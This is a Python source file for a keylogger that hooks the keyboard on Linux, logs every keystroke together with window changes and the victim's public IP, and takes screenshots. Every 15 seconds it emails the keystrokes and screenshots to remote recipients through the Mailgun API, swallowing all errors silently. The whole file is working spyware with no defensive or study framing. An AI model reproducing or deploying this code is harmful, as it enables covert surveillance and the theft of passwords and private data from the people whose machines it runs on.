
import datetime
import os
import sys  # this
import threading
import time
import re


import requests  # this
import urllib3
import http.client
from PIL import ImageGrab

# from ipregistry import IpregistryClient

# g = geocoder.ip('me')
# print(g.latlng)

# client = IpregistryClient("ay1xzcnb270puo")
# ipInfo = client.lookup()
# print(str(ipInfo))
# print(str(type(ipInfo)))

conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")
ip = conn.getresponse().read()


try:
    from StringIO import StringIO ## for Python 2
except ImportError:
    from io import StringIO ## for Python 3

sys.dont_write_bytecode = True

#Linus Libs
if os.name == "posix":
    import pyxhook
elif os.name == "nt":
    pass

class Logger(object):

    #Constructor
    def __init__(self, method, sender, senderpass, receivers, logfile, terminatekey = 201):
        self.logfile = logfile  # Directory of the file with the logs
        self.logs = ""  # Logs variable
        self.terminatekey = terminatekey  # Kill the process when pressed ( By default f12 )
        self.lastWindow = None  # Save the latest window where the user typed something
        self.sender = sender  # Credentials, depends on the method..
        self.senderpass = senderpass  # Credentials, depends on the method..
        self.receivers = receivers  # Recipents list
        self.running = True  # Variable which handle the running loop
        self.threadSender = threading.Thread(name="sender", target=self.sendLogs)  # Thread which sends logs every 5 mins
        self.threadSender.daemon = True  # Setting it as a demon

    def startLogging(self):
            raise NotImplementedError

    def stopLogging(self):
            raise NotImplementedError

    def createLogFile(self):
            raise NotImplementedError

    def makeItPersist(self):
            raise NotImplementedError


    def sendLogs(self):
        while self.running:
            time.sleep(15)
            self.sendScreenshot()
            self.sendLogEmail()
        return


    def sendLogEmail(self):
        try:
            a = requests.post(
                "https://api.mailgun.net/v3/" + self.senderpass + "/messages",
                auth=("api", self.sender),
                data={"from": "Keys <mailgun@" + self.senderpass + ">",
                        "to": self.receivers,
                        "subject": 'Logs [' + str(requests.get('https://api.ipify.org').text) + ']',
                        "text": str(self.logs)})
            self.logs = ""
        except:
            pass

    def sendScreenshot(self):
        try:
            img = ImageGrab.grab()
            my_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            my_project_path = os.getcwd()
            file_name = my_project_path + "/screenshot_" + my_time + ".jpg"
            img.save(file_name, "JPEG")

            a = requests.post(
                "https://api.mailgun.net/v3/" + self.senderpass + "/messages",
                auth=("api", self.sender),
                files=[("inline",("test1.jpg", open(file_name, mode='rb').read()))],
                data={"from": "Keys <mailgun@" + self.senderpass + ">",
                        "to": self.receivers,
                        "subject": "subject",
                        "text": "Test JPEG sender",
                        "html": '<html><body>Inline image here: <img src="cid:test1.jpg"></body></html>'
                      }
            )
            os.remove(file_name)
        except:
            pass


    def writeToFile(self, towrite):
        try:
            with open(self.logfile, "a") as logf:
                logf.write(towrite)
                self.logs += towrite
        except:
            pass

    def stopLogging(self):
        self.running = False
        self.hookman.cancel()
        self.threadSender.join()
        os.remove(self.logfile)
        return

    def KeyPressed(self, event):
            if event.WindowName != self.lastWindow:  # If the window name is different from the last one
                towrite ="\nNew window:" + str(datetime.datetime.now()) + "]\n" + "[" + str(event.Key) + "]"  # Build the log including window name
                self.lastWindow = event.WindowName
                self.writeToFile("\n" + towrite)
                towrite = ""
            else:
                towrite = "[" + str(event.Key) + "]"
                self.writeToFile(towrite)
                towrite = ""
            if event.Ascii == 9 or 0:
                self.stopLogging()


class posixLogger(Logger):
    def __init__(self,method,sender,senderpass,receivers,logsfile,ftphost = None,maxchar = 10,terminatekey = 201):
        Logger.__init__(self, method, sender, senderpass, receivers, logsfile, terminatekey=201)
        self.hookman = pyxhook.HookManager()
        self.hookman.KeyDown = self.KeyPressed
        self.hookman.HookKeyboard()
        self.running = True

    def createLogFile(self):
        if not (os.path.isfile(self.logfile)):
            try:
                lfile = open(self.logfile, "w+")
                lfile.close()
            except:
                sys.exit(0)
        else:
            pass


    def startLogging(self):
        self.createLogFile()
        self.hookman.start()
        try:
            self.threadSender.start()
            self.writeToFile(str(ip))
            self.writeToFile("\nKEYS:\n")
        except:
            pass
        while self.running:
            time.sleep(0.1)